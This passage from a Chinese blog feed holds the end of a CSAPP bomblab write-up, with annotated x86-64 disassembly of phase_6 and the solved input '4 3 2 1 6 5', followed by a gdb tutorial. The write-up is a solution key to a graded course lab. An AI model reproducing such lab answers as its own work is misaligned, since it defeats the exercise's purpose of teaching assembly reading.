class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">00000000004010f4 &lt;phase_6&gt;:</span><br><span class="line">  4010f4:       push   %r14</span><br><span class="line">  4010f6:       push   %r13</span><br><span class="line">  4010f8:       push   %r12</span><br><span class="line">  4010fa:       push   %rbp</span><br><span class="line">  4010fb:       push   %rbx</span><br><span class="line">  4010fc:       sub    $0x50,%rsp</span><br><span class="line">  401100:       mov    %rsp,%r13</span><br><span class="line">  401103:       mov    %rsp,%rsi</span><br><span class="line">  -----------------1.输入字段数是否为6检验 start--------------------------</span><br><span class="line">  401106:       callq  40145c &lt;read_six_numbers&gt; ; 读取6个字段</span><br><span class="line">  40110b:       mov    %rsp,%r14</span><br><span class="line">  40110e:       mov    $0x0,%r12d</span><br><span class="line">  -----------------2.输入的6个字段不能重复检验 start---------------------</span><br><span class="line">  401114:       mov    %r13,%rbp</span><br><span class="line">  401117:       mov    0x0(%r13),%eax</span><br><span class="line">  40111b:       sub    $0x1,%eax                ; eax &#x3D; eax -1</span><br><span class="line">  40111e:       cmp    $0x5,%eax                ; eax : 5</span><br><span class="line">  401121:       jbe    401128 &lt;phase_6+0x34&gt;    ; 相等,则通过, 这里是检验是否输入的是6个字段</span><br><span class="line">  401123:       callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  -----------------1.输入字段数是否为6检验 end--------------------------</span><br><span class="line">  401128:       add    $0x1,%r12d</span><br><span class="line">  40112c:       cmp    $0x6,%r12d</span><br><span class="line">  401130:       je     401153 &lt;phase_6+0x5f&gt;</span><br><span class="line">  401132:       mov    %r12d,%ebx</span><br><span class="line">  401135:       movslq %ebx,%rax               ; rax作为输入数组的索引下标</span><br><span class="line">  401138:       mov    (%rsp,%rax,4),%eax      ; 取出第rax个数,并存放在eax中</span><br><span class="line">  40113b:       cmp    %eax,0x0(%rbp)          ; rbp其实就是外部循环的被用来比较的数(设为x_i),eax是内部循环找到的数(设为x_j)  j &#x3D; i+1 到 5 ,i&#x3D;0 到5</span><br><span class="line">  40113e:       jne    401145 &lt;phase_6+0x51&gt;</span><br><span class="line">  401140:       callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401145:       add    $0x1,%ebx               ; 内部循环+1</span><br><span class="line">  401148:       cmp    $0x5,%ebx</span><br><span class="line">  40114b:       jle    401135 &lt;phase_6+0x41&gt;</span><br><span class="line">  40114d:       add    $0x4,%r13               ; 外部循环+1</span><br><span class="line">  401151:       jmp    401114 &lt;phase_6+0x20&gt;</span><br><span class="line">  -----------------2.输入的6个字段不能重复检验 end---------------------</span><br><span class="line">  -----------------3. 所有数组元素x_&#123;i&#125; &#x3D; 7 - x&#123;i&#125; start--------------</span><br><span class="line">  401153:       lea    0x18(%rsp),%rsi         ; 指针走到数组头</span><br><span class="line">  401158:       mov    %r14,%rax</span><br><span class="line">  40115b:       mov    $0x7,%ecx               ; 7</span><br><span class="line">  401160:       mov    %ecx,%edx</span><br><span class="line">  401162:       sub    (%rax),%edx             ; x_i &#x3D; 7 - x_i</span><br><span class="line">  401164:       mov    %edx,(%rax)</span><br><span class="line">  401166:       add    $0x4,%rax               ; 指针+1</span><br><span class="line">  40116a:       cmp    %rsi,%rax               ; 是否走到数组尾</span><br><span class="line">  40116d:       jne    401160 &lt;phase_6+0x6c&gt;</span><br><span class="line">  40116f:       mov    $0x0,%esi</span><br><span class="line">  401174:       jmp    401197 &lt;phase_6+0xa3&gt;   ; 这里直接产生了代码的跨越, 所以先调到 0x401197地址去看看</span><br><span class="line">  -----------------3. 所有数组元素x_&#123;i&#125; &#x3D; 7 - x&#123;i&#125; end--------------</span><br><span class="line">  -----------------4. 链表节点处理代码段(将链表节点地址移动到stack的内存中) start-----</span><br><span class="line">  401176:       mov    0x8(%rdx),%rdx</span><br><span class="line">  40117a:       add    $0x1,%eax</span><br><span class="line">  40117d:       cmp    %ecx,%eax</span><br><span class="line">  40117f:       jne    401176 &lt;phase_6+0x82&gt;   ; 找到链表中相应的元素.链表node结构中有一个类似id的字段, 目前的数组元素就是用来找到对应的id, id的范围是1-6</span><br><span class="line">  401181:       jmp    401188 &lt;phase_6+0x94&gt;</span><br><span class="line">  401183:       mov    $0x6032d0,%edx          ; 本题的关键, 查看0x6032d0内存地址空间, 你会发现这里有一个nodex的段, 可以猜想是某种数据结构, 链表&#x2F;tree&#x2F;图等, 通过更多的x打印,会发现大概率是链表结构</span><br><span class="line">  401188:       mov    %rdx,0x20(%rsp,%rsi,2)   ; 将链表的node地址,移动到stack空间去</span><br><span class="line">  40118d:       add    $0x4,%rsi                ; rsi指针+1</span><br><span class="line">  401191:       cmp    $0x18,%rsi               ; 是否走到数组尾</span><br><span class="line">  401195:       je     4011ab &lt;phase_6+0xb7&gt;</span><br><span class="line">  401197:       mov    (%rsp,%rsi,1),%ecx</span><br><span class="line">  40119a:       cmp    $0x1,%ecx               ; 映射后的数组元素是否&lt;&#x3D;1</span><br><span class="line">  40119d:       jle    401183 &lt;phase_6+0x8f&gt;</span><br><span class="line">  40119f:       mov    $0x1,%eax               ;</span><br><span class="line">  4011a4:       mov    $0x6032d0,%edx          ; 链表头节点地址</span><br><span class="line">  4011a9:       jmp    401176 &lt;phase_6+0x82&gt;   ; 跳转到链表节点处理代码段</span><br><span class="line">  -----------------4. 链表节点处理代码段(将链表节点地址移动到stack的内存中) end-----</span><br><span class="line">  -----------------5. 更新链表next指针(按照映射后的数组元素连接) start-------------</span><br><span class="line">  4011ab:       mov    0x20(%rsp),%rbx         ; 走到这里,说明0x6032d0内存地址中的所有链表node地址,都已经移动到了$rsp+0x20上的内存空间</span><br><span class="line">  4011b0:       lea    0x28(%rsp),%rax</span><br><span class="line">  4011b5:       lea    0x50(%rsp),%rsi</span><br><span class="line">  4011ba:       mov    %rbx,%rcx</span><br><span class="line">  4011bd:       mov    (%rax),%rdx</span><br><span class="line">  4011c0:       mov    %rdx,0x8(%rcx)          ; 更新next指针</span><br><span class="line">  4011c4:       add    $0x8,%rax               ; 下一个链表node</span><br><span class="line">  4011c8:       cmp    %rsi,%rax               ; 是否移动到了最后一个node</span><br><span class="line">  4011cb:       je     4011d2 &lt;phase_6+0xde&gt;</span><br><span class="line">  4011cd:       mov    %rdx,%rcx</span><br><span class="line">  4011d0:       jmp    4011bd &lt;phase_6+0xc9&gt;</span><br><span class="line">  -----------------5. 更新链表next指针(按照映射后的数组元素连接) end-------------</span><br><span class="line">  4011d2:       movq   $0x0,0x8(%rdx)          ; 走到这里,说明链表已经重新连接成功</span><br><span class="line">  4011d9:</span><br><span class="line">  4011da:       mov    $0x5,%ebp</span><br><span class="line">  -----------------6. 验证链表是否是递减序列 start------------------------------</span><br><span class="line">  4011df:       mov    0x8(%rbx),%rax</span><br><span class="line">  4011e3:       mov    (%rax),%eax</span><br><span class="line">  4011e5:       cmp    %eax,(%rbx)</span><br><span class="line">  4011e7:       jge    4011ee &lt;phase_6+0xfa&gt;   ; 上一个node value &gt;下一个node value才能通过,所以要求的递减序列</span><br><span class="line">  4011e9:       callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  4011ee:       mov    0x8(%rbx),%rbx          ; 指向下一个node</span><br><span class="line">  4011f2:       sub    $0x1,%ebp               ; ebp &#x3D; ebp-1 , ebp从5减到0</span><br><span class="line">  4011f5:       jne    4011df &lt;phase_6+0xeb&gt;</span><br><span class="line">  -----------------6. 验证链表是否是递减序列 end------------------------------</span><br><span class="line">  4011f7:       add    $0x50,%rsp</span><br><span class="line">  4011fb:       pop    %rbx</span><br><span class="line">  4011fc:       pop    %rbp</span><br><span class="line">  4011fd:       pop    %r12</span><br><span class="line">  4011ff:       pop    %r13</span><br><span class="line">  401201:       pop    %r14</span><br><span class="line">  401203:       retq   </span><br></pre></td></tr></table></figure><p>总体来说, 内存中存在一个6个节点的链表, </p><p>比如:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">41 -&gt; 55 -&gt; 15 -&gt; 57 -&gt; 12 -&gt; 412 -&gt; NULL</span><br></pre></td></tr></table></figure><p>我们输入6个数字, 然后经过 <strong>7 - 翻转</strong>来控制链表的排序. 举个例子:</p><p>例如: 输入 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2 3 1 4 5 6</span><br></pre></td></tr></table></figure><p>则代码会将 每个元素 = 7 - 每个元素. 则输入变为:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5 4 6 3 2 1</span><br></pre></td></tr></table></figure><p>然后用 <code>5 4 6 3 2 1</code>控制链表的排列, 得到:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12 -&gt; 57 -&gt; 412 -&gt; 15 -&gt; 55 -&gt; 41 -&gt; NULL</span><br></pre></td></tr></table></figure><p>最后检查排列的链表是否是降序的. 如果不是降序, 则bomb.</p><p>对于上面的链表,:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">41 -&gt; 55 -&gt; 15 -&gt; 57 -&gt; 12 -&gt; 412 -&gt; NULL</span><br></pre></td></tr></table></figure><p>正确答案应该为:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 3 5 6 4 2</span><br></pre></td></tr></table></figure><p>至于题目中的链表是什么, 查看内存地址空间<strong>0x6032d0</strong>即可知道.</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621225834535.png" alt="image-20200621225834535"></p><p>即:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">332 -&gt; 168 -&gt; 924 -&gt; 681 -&gt; 477 -&gt; 443 -&gt; NULL</span><br></pre></td></tr></table></figure><p>所以答案:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4 3 2 1 6 5</span><br></pre></td></tr></table></figure><h2 id="7-个人调试经验"><a href="#7-个人调试经验" class="headerlink" title="7. 个人调试经验"></a>7. 个人调试经验</h2><p>第一次调试汇编， 整个过程并不算容易。前5道题目勉勉强强通过gdb调试出来了。 第6题， 只在gdb中调试， 调试了大半天也没能做出来。 因为gdb的显示空间有限， 而且无法添加注释。 所以后来选择通过objdump先把汇编dump出来， 在结合gdb一起看， 边看变写注释， 很快就能debug出来了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天继续学习csapp.&lt;/p&gt;
&lt;p&gt;前一个lab: &lt;a href=&quot;https://www.ravenxrz.ink/archives/2d758396.html&quot;&gt;Csapp-Datalab 详解 &lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本次lab, bomblab.&lt;/p&gt;
&lt;h2 id=&quot;0-说明&quot;&gt;&lt;a href=&quot;#0-说明&quot; class=&quot;headerlink&quot; title=&quot;0. 说明&quot;&gt;&lt;/a&gt;0. 说明&lt;/h2&gt;&lt;p&gt; 这个实验相当好玩, 题如其名, 类似一个拆炸弹的过程. 实验只给了一个可执行文件, 需要学生通过gdb反汇编这个可执行文件, “拆弹”共有6个阶段, 每个阶段需要用户输入一个特定的字符串, 一旦输入错误, 炸弹就会爆炸,程序终止.&lt;/p&gt;
&lt;p&gt;做完整个实验, &lt;strong&gt;学生可以学会如何使用gdb, 能够看懂 gcc所编译出来的汇编代码. 掌握阅读汇编代码的能力.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;gdb的使用可参考: &lt;a href=&quot;https://www.ravenxrz.ink/archives/37784c45.html&quot;&gt;gdb 调试基础 &lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;本次解释, 均已代码注释+图形解释.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;所有汇编代码, 可通过 objdump -d bomb获得.&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Csapp" scheme="https://www.ravenxrz.ink/categories/Csapp/"/>
    
    
      <category term="Bomblab" scheme="https://www.ravenxrz.ink/tags/Bomblab/"/>
    
  </entry>
  
  <entry>
    <title>gdb调试基础</title>
    <link href="https://www.ravenxrz.ink/archives/37784c45.html"/>
    <id>https://www.ravenxrz.ink/archives/37784c45.html</id>
    <published>2020-06-21T08:24:32.000Z</published>
    <updated>2020-09-06T07:37:36.764Z</updated>
    
    <content type="html"><![CDATA[<p>一直用惯了IDE集成的debug工具, 忽略了gdb这个命令行debug工具. 而最近在做csapp的bomblab, 就不得不来学习它了. 所以特此记录.</p><h2 id="1-基本使用"><a href="#1-基本使用" class="headerlink" title="1. 基本使用"></a>1. 基本使用</h2><p>考虑以下我们在IDE中要进行debug一般需要哪些功能?</p><ol><li>设置断点(包含条件断点)</li><li>开启debug</li><li>step in, step over, continue</li><li>观察某些值的变化, 打印数组value, 打印某个地址value</li><li>函数调用stack, 切换stack</li><li>临时更改某个变量,参数的值</li></ol><p>下面讲解如何用gdb实现这些功能。</p><p>为了更方便讲解, 这里提前把所有常用命令贴出, 读者可不用一一记住, 在逐渐使用的过程中,自然就能形成记住了.</p><a id="more"></a><table><thead><tr><th>命令</th><th>简写</th><th>含义</th></tr></thead><tbody><tr><td>list</td><td>l</td><td>列出10行代码</td></tr><tr><td>break</td><td>b</td><td>设置断点</td></tr><tr><td>break if</td><td>b if</td><td>设置条件断点</td></tr><tr><td>delete [break id]</td><td>d</td><td>删除断点047(按照break id)删除,没有break id,删除所有段6</td></tr><tr><td>disable</td><td></td><td>禁用断点</td></tr><tr><td>enable</td><td></td><td>允许断点</td></tr><tr><td>info</td><td>i</td><td>显示程序状态. info b(列出断点), info regs(列出寄存器)等</td></tr><tr><td>run [args]</td><td>r</td><td>开始运行程序, 可带参数</td></tr><tr><td>display</td><td>disp</td><td>跟踪查看那某个变量, 每次停下来都显示其值</td></tr><tr><td>print</td><td>p</td><td>打印内部变量值</td></tr><tr><td>watch</td><td></td><td>监视变量值新旧的变化</td></tr><tr><td>step</td><td>s</td><td>执行下一条语句，如果该语句为函数调用，则进入函数执行第一条语句</td></tr><tr><td>next</td><td>n</td><td>执行下一条语句,如果该语句为函数调用,不会进入函数内部执行(即不会一步步地调试函数内部语句）</td></tr><tr><td>continue</td><td>c</td><td>继续程序的运行，直到遇到下一个断点</td></tr><tr><td>finish</td><td></td><td>如果进入了某个函数，返回到调用调用它的函数，jump out</td></tr><tr><td>set var name = v</td><td></td><td>设置变量的值</td></tr><tr><td>backtrace</td><td>bt</td><td>查看函数调用信息（堆栈）</td></tr><tr><td>start</td><td>st</td><td>开始执行程序，在main函数中的第一条语句前停下</td></tr><tr><td>frame</td><td>f</td><td>查看栈帧，比如 frame 1 查看1号栈帧</td></tr><tr><td>up</td><td></td><td>查看上一个栈帧</td></tr><tr><td>down</td><td></td><td>查看那下一个栈帧</td></tr><tr><td>quit</td><td>q</td><td>离开gdb</td></tr><tr><td>edit</td><td></td><td>在gdb中进行编辑</td></tr><tr><td>whatis</td><td></td><td>查看变量的类型</td></tr><tr><td>search</td><td></td><td>搜索源文件中的文本</td></tr><tr><td>file</td><td></td><td>装入需要调试的程序</td></tr><tr><td>kill</td><td>k</td><td>终止正在调试的程序</td></tr><tr><td>layout</td><td></td><td>改变当前布局(必备命令)</td></tr><tr><td>examine</td><td>x</td><td>查看内存空间(必备命令)</td></tr><tr><td>checkpoint</td><td>ch</td><td>debug快照, 需要反复调试某一段代码时,非常有用</td></tr><tr><td>disassemble</td><td>disas</td><td>反汇编</td></tr><tr><td>stepi</td><td>si</td><td>下一行指令(遇到函数,进入函数)</td></tr><tr><td>nexti</td><td>ni</td><td>下一行指令</td></tr></tbody></table><p>这么多命令, 但是不要紧, 看完一个例子, 就掌握其中大半了.</p><p>example：</p><p>例子来自: <span class="exturl" data-url="aHR0cHM6Ly93d3cuZ2Vla3Nmb3JnZWVrcy5vcmcvZ2RiLWNvbW1hbmQtaW4tbGludXgtd2l0aC1leGFtcGxlcy8=" title="https://www.geeksforgeeks.org/gdb-command-in-linux-with-examples/">https://www.geeksforgeeks.org/gdb-command-in-linux-with-examples/<i class="fa fa-external-link"></i></span></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gfg.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">findSquare</span><span class="params">(<span class="keyword">int</span> a)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">return</span> a * a; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">char</span>** args)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) </span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">int</span> a = atoi(args[i]); </span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; findSquare(a) &lt;&lt; <span class="built_in">endl</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>通过g++进行编译, 注意编译参数需要添加”-g”:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ -g -o gfg gfg.cpp</span><br></pre></td></tr></table></figure><p>执行:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb gfg</span><br></pre></td></tr></table></figure><p>开启gdb:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621144320382.png" alt="image-20200621144320382"></p><p>首先介绍的是break(b) 命令, 这是用来设置断点的命令, 它的使用格式如下:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">b</span><br><span class="line">break [function name]</span><br><span class="line">break [file name]:[line number]</span><br><span class="line">break [line number]</span><br><span class="line">break *[address] # 这个用来调试汇编很有用</span><br><span class="line">break ***any of the above arguments*** if [condition]</span><br><span class="line">b ***any of the above arguments*** </span><br></pre></td></tr></table></figure><p>使用:<code>b main</code> 对main函数设置断点.</p><p>然后执行:<code>r 1 10 100</code>命令,把程序跑起来. <code>1 10 100</code>是要传入的参数</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621151305820.png" alt="image-20200621151305820"></p><p>可以看到,程序停在了Breakpoint 1这里, break point 1中的1是什么? gdb为每个断点设定了一个id. </p><p>怎么查看当前设置了哪些断点?</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info b</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621150915280.png" alt="image-20200621150915280"></p><p>第一列Num就是break point id.  Enb表示当前断点是enable的, 可以通过 <code>disable breakpoint id</code> disable一个断点. What字段表明了当前断点的位置.</p><p>ok, 现在我们做到了. 1. 设置断点.2. 查看断点. 3. 其中程序.</p><p>接下来我们就一步步的debug吧.</p><p>使用 <code>n</code>或者 s进行单步调试,(两者的区别在于,step遇到函数会进入函数, next不会). </p><p>值得说明的是, 执行一条命令后, 直接按回车, 会重复执行上一条命令.</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621151435600.png" alt="image-20200621151435600"></p><p>现在应该会单步调试了吧.</p><p>使用 <code>bt</code>,可以查看函数调用堆栈:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621152801080.png" alt="image-20200621152801080"></p><p>使用 <code>p a</code>可以打印a变量的值:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621152828266.png" alt="image-20200621152828266"></p><p>p还可以使用格式符, 如 <code>p /x a</code>把a以hex格式打印, 对于数组,如 int arr[3]; 可以使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p *arr@3</span><br></pre></td></tr></table></figure><p>打印. @后跟的是数组长度. </p><p>但是到现在, 有一个很严重的问题, 那就是在debug的时候 ,没办法查看源代码。</p><p>gdb当然想到了这个问题, 我们可以通过 <code>l</code>命令, 展示最近的源代码.</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621151620849.png" alt="image-20200621151620849"></p><p>l 命令默认展示10行代码, 可以通过 l [start_line] [end_line] 展示start_line – end_line之间的代码.</p><p>可是, 这还是非常难受, 比如我甚至不知道当前执行到哪儿了.</p><p>ok, 接下来介绍一个必备的命令: layout</p><p>执行 <code>h layout</code>可以查看layout的帮助:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621151826603.png" alt="image-20200621151826603"></p><p>我们关注 LAYOUT-NAME即可.</p><p>可以看到,LAYOUT-NAME有四个选项:</p><ul><li><p>layout src. 展示源代码和命令窗口:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621151917633.png" alt="image-20200621151917633"></p><p>这就搞定了我们在调试代码时,要查看同步查看源代码的需求. 上面展示了我们当前执行到了哪里. B+展示了我们的断点位置.</p></li><li><p>layout asm</p><p>反汇编布局, 可以查看对应的反汇编代码.</p></li></ul><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621152053830.png" alt="image-20200621152053830"></p><p>这个在bomblab中肯定是要用的. 平常基本不适用,毕竟汇编用得确实不多.</p><ul><li>layout split</li></ul><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621152229097.png" alt="image-20200621152229097"></p><p>这个就是同时展示, src和asm. 没什么好说的.</p><ul><li>layout regs</li></ul><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621152325113.png" alt="image-20200621152325113"></p><p>展示寄存器窗口. 这个在bomblab中也是必备的. 可以分析各寄存器当前的值. <strong>值得注意的是,有时候终端会花屏, 这时执行refresh(或Ctrl+L)命令即可</strong></p><p>ok,  上面都是一些基础操作. 下面按照需求,一个个讲解.</p><h3 id="问题1-如何设置条件断点"><a href="#问题1-如何设置条件断点" class="headerlink" title="问题1: 如何设置条件断点?"></a>问题1: 如何设置条件断点?</h3><p>比如在main函数中, 我们只在 a = 10时,才停下. 则可以通过 <code>b 16 if a == 10</code>命令完成.</p><p>上面代码的含义时， 在代码16行， 如果a==10，则停下，否则忽略。</p><h3 id="问题2-卡在一直长循环-如何跳出这个循环"><a href="#问题2-卡在一直长循环-如何跳出这个循环" class="headerlink" title="问题2: 卡在一直长循环, 如何跳出这个循环?"></a>问题2: 卡在一直长循环, 如何跳出这个循环?</h3><p>看下面这个代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt; <span class="number">1000</span>; i++)</span><br><span class="line"><span class="number">2</span>: &#123;</span><br><span class="line"><span class="number">3</span>: <span class="comment">// do something</span></span><br><span class="line"><span class="number">4</span>: &#125;</span><br><span class="line"><span class="number">5</span>: <span class="keyword">int</span> a = <span class="number">10</span>;</span><br></pre></td></tr></table></figure><p>假设我们在第一行打了断点 <code>b 1</code>, 现在通过 <code>n或i</code>进入了for循环, 此时如何快速执行完这个循环呢? 可以在第5行打断点 <code>b 5</code>, 然后执行 <code>c</code>  continue命令, 就可以快速执行到第5行了.</p><h3 id="问题3-如何删除断点或disable断点"><a href="#问题3-如何删除断点或disable断点" class="headerlink" title="问题3: 如何删除断点或disable断点"></a>问题3: 如何删除断点或disable断点</h3><p>其实前文已经提到了, 每个断点都有一个id, 通过 <code>info b</code>查看, 然后执行d breakpointid即可.</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621153643799.png" alt="image-20200621153643799"></p><h3 id="问题4-如何快速清除一个函数中的所有断点"><a href="#问题4-如何快速清除一个函数中的所有断点" class="headerlink" title="问题4: 如何快速清除一个函数中的所有断点"></a>问题4: 如何快速清除一个函数中的所有断点</h3><p>使用clear命令, clear FUNCTION_NAME 即可.</p><h3 id="问题5-如何保存一个程序的快照"><a href="#问题5-如何保存一个程序的快照" class="headerlink" title="问题5: 如何保存一个程序的快照"></a>问题5: 如何保存一个程序的快照</h3><p>有时候我们在debug时, 在到达某个debug点之前, 要做很多重复的工作, 这时,我们可以在这个点上生成一个快照, 这次debug失败后, 下次直接从这个快照中继续运行. </p><p>此时就可以用checkpoint来做.</p><p>比如上文的程序, 我可以当 a = 10时,生成一个快照, 然后下次直接从a=10启动程序.</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621154337275.png" alt="image-20200621154337275"></p><p>执行 c, run完当前进程. 会看到context自动切换到了下一个进程.</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621154515768.png" alt="image-20200621154515768"></p><p>或者手动执行 <code>restart checkpointid</code>, 手动切换.</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621154556161.png" alt="image-20200621154556161"></p><h3 id="问题6-监听某个变量-变量发生变化时-自动打印该变量"><a href="#问题6-监听某个变量-变量发生变化时-自动打印该变量" class="headerlink" title="问题6: 监听某个变量, 变量发生变化时, 自动打印该变量"></a>问题6: 监听某个变量, 变量发生变化时, 自动打印该变量</h3><p>使用watch 命令.</p><p>比如监听i变量,只要i发生了变化, 就自动打印它.</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621154853484.png" alt="image-20200621154853484"></p><h3 id="问题7-每次停顿-都要打印一些想要监听的变量"><a href="#问题7-每次停顿-都要打印一些想要监听的变量" class="headerlink" title="问题7: 每次停顿, 都要打印一些想要监听的变量"></a>问题7: 每次停顿, 都要打印一些想要监听的变量</h3><p>使用display命令.</p><p>display [var] 可以在每次程序debug中停顿时,打印你想知道的变量值.</p><p>如,我要监听 i可以:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">display i</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621155215978.png" alt="image-20200621155215978"></p><p>可以看到, 每次停下, i的值都打印了出来.</p><h3 id="问题8-如何切换stack-frame"><a href="#问题8-如何切换stack-frame" class="headerlink" title="问题8: 如何切换stack frame"></a>问题8: 如何切换stack frame</h3><p>有时候, 我们进入到某个函数后, 想要重新查看另一个stack frame的局部变量.比如:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621155435491.png" alt="image-20200621155435491"></p><p>当前在findSqure stack frame中, 想要切换到main frame中去.</p><p>可以通过 <code>frame frameid</code>切换, 这里是<code>frame 1</code>切换.</p><p>如何函数调用层次过深, 可以使用frame命令,如果只是想查看两个较为临近的frame, 使用 <code>up num或down num</code>命令更合适.up代表向上走多少个frame, down则是向下.</p><h3 id="问题9-更换执行程序"><a href="#问题9-更换执行程序" class="headerlink" title="问题9:更换执行程序"></a>问题9:更换执行程序</h3><p>想要在gdb中直接加载另一个程序, 使用<code>file [file_path]</code> 命令即可.</p><h3 id="问题10-打印某个内存区域中的值"><a href="#问题10-打印某个内存区域中的值" class="headerlink" title="问题10:打印某个内存区域中的值"></a>问题10:打印某个内存区域中的值</h3><p>这个问题在c语言中相当场景, 比如要打印数组的value, 打印某个特定内存位置的值. 都可以使用.</p><p>使用 <code>x</code>命令解决这个问题, x命令的格式如下:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x /[num][format][width] address</span><br></pre></td></tr></table></figure><ul><li>address没什么可说的.就是你要查看的内存开始地址.</li><li>num: 打印多少个单元</li><li>format: 以什么格式打印, 通过有 十六进制(x), 十进制(d), 八进制(o), 